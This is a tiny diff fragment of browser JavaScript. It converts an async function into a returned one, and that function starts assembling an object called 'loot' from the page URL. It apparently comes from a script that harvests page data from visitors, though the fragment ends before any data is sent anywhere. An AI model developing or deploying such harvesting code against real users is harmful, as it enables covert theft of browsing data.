@@ -1,4 +1,4 @@
-(async () => {
+return (async () => {
     try {
         const loot = {
             url: window.location.href,
